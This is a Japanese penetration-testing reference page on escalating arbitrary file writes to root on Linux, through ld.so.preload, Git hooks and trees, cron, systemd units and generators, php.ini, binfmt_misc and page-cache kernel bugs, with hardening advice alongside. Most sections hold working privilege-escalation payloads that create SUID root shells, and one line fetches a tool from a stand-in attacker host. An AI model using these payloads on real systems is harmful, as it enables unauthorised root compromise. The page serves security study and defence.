# Rootへの任意ファイル書き込み

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` は、動的リンカーが他の共有オブジェクトより先に読み込む、システム全体の共有オブジェクト一覧です。secure-execution mode では preloading に追加の制限が適用されるため、`/tmp/pe.so` のようなライブラリパスは、あらゆる SUID-binary に使える汎用的な手法ではありません。\
このファイルを作成または変更できる場合、このファイルを読み込むプロセスは、他の共有オブジェクトより先に指定されたライブラリを読み込みます。これにより、そのプロセスのコンテキストでコードを実行できます。<sup>[[12]](#references)</sup>

例: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** は、commit や merge 操作など、リポジトリ内のイベントで実行される実行可能なスクリプトです。**特権スクリプトまたはユーザー**がこれらの操作を行い、攻撃者が**`.git` フォルダーに書き込める**場合、hook を**privilege escalation**に利用できます。<sup>[[13]](#references)</sup>

たとえば、新しい commit が作成されるたびに実行されるよう、git repo の **`.git/hooks`** に**スクリプトを生成**できます:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### 特権付き Git tree export のパストラバーサル

特権付きの同期プログラムが checkout を避け、攻撃者の影響を受けるリポジトリを `git ls-tree` で列挙し、各 blob を `git cat-file` で読み取り、報告されたパス名をステージングディレクトリに結合して自ら書き込む場合があります。`-c safe.directory=*`（所有者の異なるリポジトリに対する Git の保護機能を無効化）と、書き込み先の範囲チェックの欠如が組み合わさると、**同期プログラムの権限による任意ファイル書き込み**が可能になります。絶対パスの tree エントリ名を指定すると、Python の `os.path.join(stage, name)` は `stage` を破棄します。相対パスに `../` が含まれている場合は、ファイルシステムによるパス解決時にディレクトリの外へ抜け出します。アプリケーションは Git に checkout させず、tree の内容をそのままファイルに書き出すため、checkout 時のパス名検証では書き込み先を保護できません。<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

root 権限で動作するサービス、タイマー、デプロイエージェント、テンプレートインポーター、バックアップ／リストアのジョブで、次のようなコードパターンを探してください。<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

tree エントリは `<mode> SP <name> NUL <raw object ID>` としてエンコードされます。`git hash-object --literally` オプションを使うと、通常のパースや `git fsck` では拒否される可能性のあるオブジェクトデータも意図的に許可されるため、使い捨ての clone で、ファイル名が絶対パスの宛先となる tree を作成できます。この例では、cron ファイルの blob を作成し、細工した tree を commit で包んで、ブランチをその commit に移動します。ただし、悪用には、特権ジョブが利用するリポジトリを更新する権限と、不正なオブジェクトを受け入れる Git server が必要です。<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardeningでは、repositoryの取り込みと最終的なfilesystem操作の両方を対象にする必要があります:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*`を、サービスが信頼する必要のあるrepositoryのみに置き換え、可能な場合はroot権限なしでrepository処理を実行します。
- materializeする前に、絶対パス名や、`.`または`..`のcomponentを含む名前を拒否します。結合後にcanonicalizeし、宛先が意図したroot配下にあることを確認します。
- check-then-openによるsymlink raceを避けます。信頼できるdirectory descriptorを基準に相対パスで開き、Linuxでは、攻撃者が制御するパスに`RESOLVE_BENEATH`と`RESOLVE_NO_SYMLINKS`を指定した`openat2()`を使います。
- plumbing出力からcheckoutを再実装するのではなく、隔離したdirectoryで通常のcheckoutを行います。raw-objectの取り込みが必要な場合は、`receive.fsckObjects=true`などのreceive側の検証を有効にします。細工されたtreeを拒否するために必要な、パス名関連の`receive.fsck.*`の検出項目を無効化しないでください。

### 特権設定のデプロイ

一部の管理サービスは、意図するシステム状態を設定ファイルに保存し、その後、昇格した権限でデプロイします。たとえば、[openmediavaultは設定を`/etc/openmediavault/config.xml`に保存し](https://docs.openmediavault.org/en/7.x/faq.html)、その[RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html)からサービスの変更を適用できます。低権限のアカウントがこのファイルを書き換えたり置き換えたりできる場合、認可されたデプロイを要求できるか、選択されたmoduleが変更されたfieldをrootとして使用するかを確認してください。SSH account key、scheduled command、package installationにはそれぞれ異なる前提条件があります。ファイルが存在することやXMLファイルが書き込み可能であることだけでは、いずれも証明されません。列挙中に設定を編集したりapply操作を実行したりせず、ファイルと親directoryのpermission、呼び出し元のgroupとRPC authorization、インストール済みversion、実際のconsumerを確認します。

`/etc/fail2ban/action.d/`にあるFail2Banのaction定義も、特権設定の境界です。このdirectoryへの書き込みと検索が可能なユーザーは、action定義を置き換えたりoverrideを追加したりできる場合がありますが、directoryのpermissionだけではcode executionを立証できません。有効なjailが実際に該当actionを選択していること、Fail2Ban serviceがより高い権限でそれを実行すること、認可されたreload/restartの後に条件に一致するban eventが発生することを確認してください。Fail2Banをrestartするsudo permissionが関係するのは、それが正確なservice呼び出しに適用され、変更した定義が読み込まれる場合に限られます。[Fail2Banのaction設定](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5)にはaction directoryとjailの関係が記載されており、[sample action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf)には、`actionban`がban時にservice userの権限で実行されることが示されています。列挙中にactionを変更したりbanを発生させたりせず、permissionと有効な設定を調べてください。

有効なFail2Ban jailがWHOIS情報を付加するmail actionを使う場合には、別の境界が存在します。[CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm)では、信頼できないWHOISテキストがGNU mailutilsの`mail`にパイプされ、そのescape処理によってcommandを実行できる問題が発生しました。低権限のfile writerが**選択されたWHOIS client**のserver override設定を変更できる場合、応答に影響を与えられる可能性があります。[Debianの`whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html)にはそのようなファイルの例が記載されていますが、パスと使用方法はインストール環境によって異なります。有効なjail/action、service identity、実際のWHOIS clientと設定パス、mailの実装、応答の制御可能性、インストール済みのvendor fixまたはbackportを確認してください。WHOIS設定ファイルが書き込み可能であること、Fail2Banのversion、mail actionがあることだけでは、この一連の条件を立証できません。受動的な列挙中に外部serverへ問い合わせたりbanを発生させたりしないでください。

### TFTPによるファイル作成と特権package hook

アクセス可能なTFTP serviceは、tftpd-hpaの**有効な**設定がrootで実行され、filesystem rootを`--secure` directoryとして公開し、`--create`を有効にしている場合、containerまたはローカルユーザーの境界を越える可能性があります。[tftpd-hpaのmanual](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html)には、ファイル作成とuserのoptionが記載されています。これは、`/etc/apt/apt.conf.d/`を含む特権設定directoryに新しいファイルを作成する手段になり得ますが、既存のファイルは置き換えられない場合があります。[APTの設定manual](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html)には、`APT::Update::Pre-Invoke` commandが記載されています。rootで実行される`apt update`がより高い権限のconsumerとなるのは、新しい設定ファイルを読み込む場合に限られます。実行中daemonの実際のargumentとidentity、network到達性とfiltering、対象directoryの作成ポリシー、APTの有効な設定scope、後続の特権実行を確認してください。デフォルトのファイル、書き込み可能な対象directory、scheduled APT commandだけでは、一連の条件全体を立証できません。受動的なtriageでは、範囲を限定してローカル設定とmetadataのみを読み取り、ファイルのuploadやAPTの実行は行わないでください。

### CronとTime関連ファイル

rootが実行するcron関連ファイルに**書き込み可能**であれば、通常は次回のjob実行時にcode executionを得られます。注目すべき対象は次のとおりです:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- `/var/spool/cron/`または`/var/spool/cron/crontabs/`にあるroot自身のcrontab
- `systemd` timerと、それらが起動するservice

簡単な確認方法:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

典型的な悪用経路:

- `/etc/crontab` または `/etc/cron.d/` 内のファイルに **新しい root cron job を追記する**
- `run-parts` によって実行される既存のスクリプトを **置き換える**
- 起動するスクリプトまたはバイナリを変更して **既存の timer target にバックドアを仕込む**

cron payload の最小例:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

`run-parts` が使用する cron ディレクトリ内にしか書き込めない場合は、代わりにそこへ実行可能ファイルを置きます:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notes:

- `run-parts` は通常、ドットを含むファイル名を無視するため、`backup.sh` ではなく `backup` のような名前を使ってください。<sup>[[15]](#references)</sup>
- システムによっては従来の cron の代わりに `systemd` timers を使いますが、悪用の考え方は同じです。**root が後で実行するものを変更する**ことです。<sup>[[20]](#references)</sup>

### Service & Socket files

**`systemd` unit files** またはそれらが参照するファイルに書き込める場合、unit を再読み込みして再起動するか、service/socket の activation path がトリガーされるのを待つことで、root として code execution を得られる可能性があります。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

ACL を含め、system unit directory 自体への書き込み権限と検索権限も確認してください。directory の読み取りや一覧表示が拒否されていても、ユーザーが `/etc/systemd/system` に新しい unit を作成できる場合があります。ただし、その path があるだけでは何も起動しません。system manager が新しい unit を読み込むこと、その名前に対して呼び出し元に実効的な root 権限での `systemctl start` または `restart` の許可（あるいは別の特権 activation path）があること、そして service が意図した identity で実行されることを確認してください。ディスク上で変更された既存の loaded unit では `daemon-reload` が必要な場合があります。新しい名前の unit は読み込み動作が異なります。wildcard を使った restart ルールで十分と判断する前に、sudo の引数と除外条件を正確に確認してください。[systemd unit search path](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) と [systemctl loading and reload semantics](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html) を参照してください。

興味深い対象は次のとおりです。

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 内の Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` が参照する service scripts/binaries
- root service が読み込む書き込み可能な `EnvironmentFile=` paths

簡単な確認方法:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

よくある悪用経路:

- **変更可能なroot所有のservice unitで`ExecStart=`を上書きする**
- **悪意のある`ExecStart=`を含むdrop-in overrideを追加し、先に古い設定をクリアする**
- **unitからすでに参照されているスクリプトやバイナリにbackdoorを仕込む**
- **対応する`.service`ファイルを変更して、socketが接続を受けたときに起動するsocket-activated serviceをHijackする**

悪意のあるoverrideの例:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

一般的な有効化フロー:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

自分でサービスを再起動できなくても、socket-activated unit を編集できる場合は、**クライアント接続を待つ**だけで、バックドアを仕込んだサービスを root として実行させられることがあります。<sup>[[17]](#references)</sup>

### systemd generator ディレクトリ

**System generators** は、起動時と設定の再読み込み時に、unit ファイルを読み込む前に system manager によって起動される実行ファイルです。そのため、system-generator ディレクトリ（または既存の実行ファイル generator）への書き込み権限は、監査で `*.service` と `*.timer` ファイルだけを確認する場合に見落としやすい、root code execution を直接可能にする手段です。<sup>[[35]](#references)[[36]](#references)</sup>

通常の検索順は、`/run/systemd/system-generators/`、`/etc/systemd/system-generators/`、`/usr/local/lib/systemd/system-generators/`、`/usr/lib/systemd/system-generators/` です（一部の distribution では、`/lib/systemd/system-generators/` が `/usr` merge 経由で公開されています）。先に検索されるディレクトリに同名の実行ファイルがあると、後のディレクトリにあるものが shadow されます。これらの**入力実行ファイル用ディレクトリ**と、generator が生成した一時的な unit 出力を格納する `/run/systemd/generator`、`/run/systemd/generator.early`、`/run/systemd/generator.late` を混同しないでください。<sup>[[35]](#references)</sup>

簡易チェック：

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

新しく作成した generator には、実行ビットを設定する必要があります。write primitive で制御できるのがバイト列だけで、mode を制御できない場合は、すでに実行可能な generator を標的にします。通常、既存ファイルをその場で切り詰めてもメタデータは保持されます。ディレクトリ自体に書き込み可能であれば、新しいエントリを作成して実行可能に設定します。<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

`systemctl daemon-reload` を **system** manager に対して実行するには適切な認可が必要ですが、実行するとすべての system generator が再実行されます。それ以外の場合は、特権ユーザーによる reload、パッケージ操作、または再起動を待ちます。`~/.config/systemd/user-generators/` などの user-generator ディレクトリは user manager のもとで実行され、それだけで root 権限を得ることは**ありません**。<sup>[[35]](#references)</sup>

ハードニングと調査では、最終的な mode bits だけでなく、すべてのパス要素と ACL を確認し、generator のハッシュとパッケージ所有者をベースライン化して、すべての system-generator 入力ディレクトリにおける作成、名前変更、内容変更、権限変更を検知してください。実行後に一度限りの generator が自身を削除することがあるため、書き込みの監視が重要です。一方、`/run/systemd/generator*` 配下の生成済み unit ツリーは、次回の reload 時に再構築されます。<sup>[[35]](#references)[[36]](#references)</sup>

### 特権 PHP sandbox で使用される制限付き `php.ini` を上書きする

一部のカスタム daemon は、**制限付き `php.ini`**（例: `disable_functions=exec,system,...`）を指定して `php` を実行し、ユーザー提供の PHP を検証します。sandbox 内のコードに `file_put_contents` のような**何らかの書き込み手段**が残っており、daemon が使用する**正確な `php.ini` のパス**にアクセスできる場合、その**設定を上書き**して制限を解除し、その後、昇格した権限で実行される2つ目の payload を送信できます。<sup>[[2]](#references)</sup>

典型的な流れ:

1. 1つ目の payload で sandbox の設定を上書きする。
2. 危険な関数が再び有効になった状態で、2つ目の payload によりコードを実行する。

最小限の例（daemon が使用するパスに置き換えてください）:

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

デーモンが root として実行される（または root 所有のパスを使って検証する）場合、2 回目の実行では root context が得られます。これは、sandbox 化された runtime が引き続きファイルを書き込める場合における、**config overwrite による privilege escalation**に相当します。

### binfmt_misc

`binfmt_misc` は `/proc/sys/fs/binfmt_misc` 配下に登録情報を公開します。各登録は、ファイル形式のパターンと interpreter を関連付けます。特権への影響は、誰が登録を変更できるか、またその後どのプロセスが一致するファイルを実行するかによって異なるため、privilege escalation の経路と判断する前に、これらの要件を確認してください。<sup>[[21]](#references)</sup>

`CAP_DAC_OVERRIDE` を持つ実行可能な helper は、呼び出し元がそのノードに直接書き込めない場合でも、呼び出し元が制御できるデータを受け付けて `/proc/sys/fs/binfmt_misc/register` に書き込むなら、別の登録経路になり得ます。列挙中に helper を実行せず、その入力処理と書き込み動作を確認してください。登録ルールで `C` flag が使われている場合、interpreter は一致したバイナリに基づく credentials を受け取ります。そのため、root 所有の SUID バイナリに一致すると、呼び出し元が制御する interpreter が root として実行される可能性があります。`binfmt_misc` の mount と登録ポリシー、helper の有効な capability、正確なルールと interpreter のパス、実行可能な SUID 対象、さらに `no_new_privs` または `nosuid` mount が SUID による権限移行を抑止するかどうかを確認してください。capability bit や埋め込みパス文字列だけでは、調査の手掛かりにすぎません。<sup>[[21]](#references)</sup> SUID の抑止条件については [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) を参照してください。

### Overwrite schema handlers (like http: or https:)

Desktop 環境では、MIME association と desktop entry を使って URI scheme に対応するアプリケーションを選択します。該当するユーザー単位の設定ディレクトリと desktop-entry ディレクトリに書き込める攻撃者は、それらの scheme を自身が制御する launcher に転送できます。`$HOME/.config/mimeapps.list` ファイルを変更し、HTTP と HTTPS の URL handler を悪意のあるファイルに関連付けると（例：`x-scheme-handler/http=evil.desktop` および `x-scheme-handler/https=evil.desktop`）、ユーザーのクリックによってその desktop entry が起動されます。<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### root がユーザー書き込み可能なスクリプト/バイナリを実行する場合

特権ワークフローが `/bin/sh /home/username/.../script` のようなコマンド（または非特権ユーザーが所有するディレクトリ内のバイナリ）を実行する場合、これを乗っ取れます:<sup>[[1]](#references)</sup>

- **実行を検出する:** pspy でプロセスを監視し、root がユーザー管理下のパスを実行するのを検知します。<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **書き込み可能か確認:** 対象ファイルとそのディレクトリが自分のユーザー所有であり、書き込み可能であることを確認します。
- **対象を乗っ取る:** 元のバイナリ／スクリプトをバックアップし、SUID shell を作成する payload（またはその他の root 操作）を実行するものに置き換えてから、権限を復元します:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **特権アクションをトリガーする**（例: helper を起動する UI ボタンを押す）。root が乗っ取ったパスを再実行したら、`./rootshell -p` で昇格した shell を取得します。

### 特権バイナリのページキャッシュのみを変更する

kernel のバグの中には、ファイルを**ディスク上で**変更しないものがあります。代わりに、読み取り可能なファイルの**ページキャッシュ上のコピー**だけを変更できます。**setuid** バイナリや、その他の**root によって実行される**バイナリを対象にできれば、ディスク上のファイルハッシュが変わらなくても、次回の実行でメモリ上の攻撃者が制御するバイト列が実行され、特権を昇格できる可能性があります。<sup>[[3]](#references)[[4]](#references)</sup>

これは**実行時のみのファイル書き込みプリミティブ**として考えるとわかりやすいです。<sup>[[3]](#references)</sup>

- **ディスク上はクリーン**: inode とディスク上のバイト列は変更されない
- **メモリ上は変更される**: キャッシュされたページを読み取り・実行するプロセスには、攻撃者が変更した内容が渡される
- **効果は一時的**: 再起動またはキャッシュの追い出し後に変更は消える

このプリミティブは、従来の**任意ファイル書き込み**と、Dirty COW / Dirty Pipe などの古い**ページキャッシュ悪用**バグの中間に位置します。<sup>[[3]](#references)</sup>

- Dirty COW は race に依存していた
- Dirty Pipe には書き込み位置の制約があった
- 脆弱な経路から、ファイルにバックされたキャッシュページへ直接書き込める場合、ページキャッシュのみを変更するプリミティブのほうが信頼性が高い

#### 一般的な privesc の流れ

1. **ファイルにバックされたページキャッシュページ**へ書き込める kernel プリミティブを入手する
2. それを**読み取り可能な特権バイナリ**、または root によって実行される別のファイルに対して使う
3. ページがキャッシュから追い出される**前に**実行をトリガーする
4. ディスク上のファイルが未変更に見える状態のまま、root として code execution を得る

価値の高い標的の例:

- **setuid-root** バイナリ
- **root サービス**が起動する helper
- **host kernel / page cache を共有する container** からよく実行されるバイナリ

#### AF_ALG + `splice()` の例

Copy Fail (CVE-2026-31431) は、この種の問題の好例です。脆弱な経路は Linux の crypto userspace API (`AF_ALG` / `algif_aead`) にありました。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` は、読み取り可能なファイルのページキャッシュページへの参照を crypto TX scatterlist に移せる
- インプレースの `algif_aead` decrypt 経路は、source buffer と destination buffer を再利用していた
- その後、`authencesn` が destination の tag 領域に書き込んだ
- その領域がまだ `splice()` されたファイルバックページを参照していると、書き込みは**標的ファイルのページキャッシュ**に反映された

つまり注目すべきなのは CVE 自体ではなく、次のパターンです。

- ファイルにバックされたキャッシュページを kernel subsystem に**渡す**
- subsystem に、それらを書き込み可能な出力として**扱わせる**
- メモリ内で小さな制御された上書きをトリガーする

公開 PoC は、メモリ上の `/usr/bin/su` に対して**4-byte write**を繰り返してパッチを当て、その後実行しました。<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone の例

DirtyClone (CVE-2026-43503) は、同じ**ページキャッシュのみを書き換えて root を得る**パターンの別の亜種です。ただし、今回は sink が `AF_ALG` ではなく**IPsec ESP decrypt**です。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

重要な技術は、**metadata-laundering の手順**です。

- `splice()` が、**読み取り専用のファイルバックページキャッシュページ**を ESP-in-UDP packet に配置する
- 元の DirtyFrag mitigation は、その skb に `SKBFL_SHARED_FRAG` を付け、`esp_input()` が decrypt 前に**コピーする**ようにしていた
- netfilter `TEE` が `nf_dup_ipv4()` -> `__pskb_copy_fclone()` を通じて packet を複製する
- clone は同じ**物理ページキャッシュ参照**を保持する一方、`SKBFL_SHARED_FRAG` を失う
- その後、`esp_input()` は clone を安全とみなし、ファイルバックページに対して**インプレースの `cbc(aes)` decrypt**を実行する

したがって、reviewer にとっての教訓は CVE より広いものです。操作前にコピーが必要かどうかを判断するために**skb/page metadata**に依存する mitigation では、backing page を保持しながら metadata を落とす**clone/copy 経路**によって、書き込みプリミティブが気づかれずに再び有効になる可能性があります。

典型的な exploit の流れ:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` を実行し、private network namespace 内で **`CAP_NET_ADMIN`** を取得する
2. loopback を有効にし、`mangle/OUTPUT` に **netfilter `TEE` rule** を設定する
3. `NETLINK_XFRM` を介して **XFRM ESP transport SA** を設定する
4. 各標的の 4-byte word を SA の `seq_hi` field にエンコードする（DirtyFrag の word-selection trick）
5. `splice()` された ESP-in-UDP packet を送信し、**TEE clone**を `esp_input()` に到達させて**インプレースで**decrypt する
6. `/usr/bin/su` または別の特権実行ファイルのページキャッシュ上のコピーに、攻撃者が制御する code が含まれるまで繰り返す

実際の影響は `AF_ALG` の例と同じです。ディスク上のファイルはクリーンなままですが、`execve()` が**変更されたページキャッシュのバイト列**を使用し、root 権限が得られます。<sup>[[8]](#references)[[9]](#references)</sup>

この亜種で有用な exposure check:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

短期的なattack surfaceの縮小も、ここでは経路ごとに異なります。`48f6a5356a33`を含むkernelにアップグレードするとclone pathが修正され、`xt_TEE`のautoloadをブロックすると**flag-laundering step**がなくなり、`esp4` / `esp6`をブロックすると**decrypt sink**がなくなります。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure and hunting

このクラスのbugが疑われる場合は、disk integrity checkだけに頼らないでください。次の点も確認してください。

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

以下の設定値は、インターフェースがロード可能なのか、カーネルに組み込まれているのかを区別します。crypto のビルドルールでは、`CONFIG_CRYPTO_USER_API_AEAD` が `algif_aead` に対応付けられています。<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` はモジュールとしてロード／アンロードできる場合があります
- `CONFIG_CRYPTO_USER_API_AEAD=y`: インターフェースはカーネルに組み込まれています
- setuid バイナリは有効な標的です。page-cache のみを対象とするパッチで、ローカルの足がかりを root 権限に昇格させられることがあるためです

#### `algif_aead` パスの攻撃対象領域の縮小

脆弱なインターフェースがロード可能なモジュールによって提供されている場合:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

カーネルに組み込まれている場合、いくつかの開示情報では、次の方法で init パスをブロックできると報告されています:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

この種の緩和策は、ほかの kernel LPE でも覚えておく価値があります。exploit が特定のオプションインターフェースに依存している場合、そのインターフェースを無効化または blacklist に登録すれば、kernel 全体を upgrade できるようになる前でも exploit path を断つことができます。<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – user-writable な PaperCut ディレクトリ内で root が実行するスクリプトの乗っ取り](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 に関する Openwall oss-security の開示](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable の修正: crypto: algif_aead - out-of-place 動作に戻す](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 の advisory](https://copy.fail/)
- [7] [Theori / Xint の技術解説](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone の repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE variant DirtyClone (CVE-2026-43503) の分析と exploit](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux の修正: net: skb: `__pskb_copy_fclone()` で `SKBFL_SHARED_FRAG` を保持 (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux の以前の緩和策: splice された UDP packet に `SKBFL_SHARED_FRAG` を設定 (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator documentation](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
